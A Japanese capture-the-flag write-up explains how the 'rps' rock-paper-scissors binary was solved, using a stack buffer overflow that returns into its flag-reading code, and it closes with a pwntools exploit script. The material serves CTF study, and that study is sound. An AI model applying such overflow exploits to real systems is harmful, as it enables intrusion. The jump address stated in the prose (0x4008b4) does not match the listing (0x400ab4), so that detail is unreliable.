# rps writeup

## バイナリを調べる
> rps: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=8811962c746e1d068a5fa5b4deb7cb043c30146f, not stripped

64bitダー
IDA買いたい欲を刺激するバイナリ

> gdb-peda$ checksec  
CANARY    : disabled  
FORTIFY   : disabled  
NX        : ENABLED  
PIE       : disabled  
RELRO     : disabled  

NX以外はかかってない。
スタックベースのオーバーフローありそう。

## プログラムの挙動
> gdb-peda$ r  
Starting program: /home/segfo/ctf_writeup/mmactf/rps/rps
What's your name: segfo  
Hi, segfo  
Let's janken  
Game 1/50  
Rock? Paper? Scissors? [RPS]R  
Rock-Scissors  
You win!!  
Game 2/50  
Rock? Paper? Scissors? [RPS]Wrong input  

じゃんけんゲームっぽい。勝った。
（競技中は正直見てなかった。Writeup書くときにじゃんけんゲームってのを知った）

> gdb-peda$ r  
Starting program: /home/segfo/ctf_writeup/mmactf/rps/rps
What's your name:   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  
Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  
Let's janken  
Game 1/50  
Rock? Paper? Scissors?   [RPS]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBB  
Wrong input

> Program received signal SIGSEGV, Segmentation fault.

SIGSEGVで落ちた  
詳細をGDBで観察してみると81バイト目でベースポインタを書き換えられる模様。  
どこに飛ばすかが問題。  
今回は、flag.txtを開いているコードがプログラム中にあったので  
そこに飛ばすことにする。  

## Objdumpで見てみる
> 400a88:       48 89 c6                mov    %rax,%rsi  
  400a8b:       bf 1b 0c 40 00          mov    $0x400c1b,%edi ;Congrats %s!!!!  
  400a90:       b8 00 00 00 00          mov    $0x0,%eax  
  ; printf("Congrats %s!!!",name) みたいな感じ（このあたりはじっくり見てない）  
  400a95:       e8 d6 fb ff ff          callq  400670 <printf@plt>  
  400a9a:       be 88 0b 40 00          mov    $0x400b88,%esi  
  400a9f:       bf 2c 0c 40 00          mov    $0x400c2c,%edi  ;flag.txt  
  ; fp = fopen("flag.txt","r")みたいな感じ  
  400aa4:       e8 47 fc ff ff          callq  4006f0 <fopen@plt>  
  400aa9:       48 89 45 e8             mov    %rax,-0x18(%rbp)  
  400aad:       48 8b 45 e8             mov    -0x18(%rbp),%rax  
  400ab1:       48 89 c2                mov    %rax,%rdx  
  400ab4:       be 64 00 00 00          mov    $0x64,%esi  
  400ab9:       bf 00 13 60 00          mov    $0x601300,%edi  
  ; fgets(buf,100,fp) みたいな感じ  
  400abe:       e8 dd fb ff ff          callq  4006a0 <fgets@plt>  
  400ac3:       bf 00 13 60 00          mov    $0x601300,%edi  
  ; puts(buf) みたいな感じ  
  400ac8:       e8 73 fb ff ff          callq  400640 <puts@plt>  

### 補足:stringsの結果（ファイルの先頭からのアドレス）
> $ strings -tx ./rps  
c03 Draw  
c08 You win!!  
c12 You lose  
c1b Congrats %s!!!!  
c2c flag.txt  

絶対アドレスに変換するにはELFが置かれるベースアドレスを足す必要がある  

## ここまでの整理と攻撃する方針を立てる
とりあえず、0x4008b4あたりに飛ばせば良さそう。("mov    $0x64,%esi")  
やってみる。

## exploit
```
#!/usr/bin/python
#coding: utf-8

from pwn import *

# r = remote("milkyway.chal.mmactf.link",1641)

# ペイロードを準備
# 80バイトまでAで埋める。
payload = 'A'*80
# ベースポインタを適当な場所にやっとく
payload += p64(0x6012c9) # rbp
# flagを読ませる
payload += p64(0x4008b4)
payload += '\n'

# つなぐ
r = remote("localhost",11111)
# ペイロードを投げる
r.write(payload)
# なんか出てくるので読む
r.read()
# 適当な入力
r.write('1\n')
r.read()
# flagを読む
print r.read()
r.close()
```
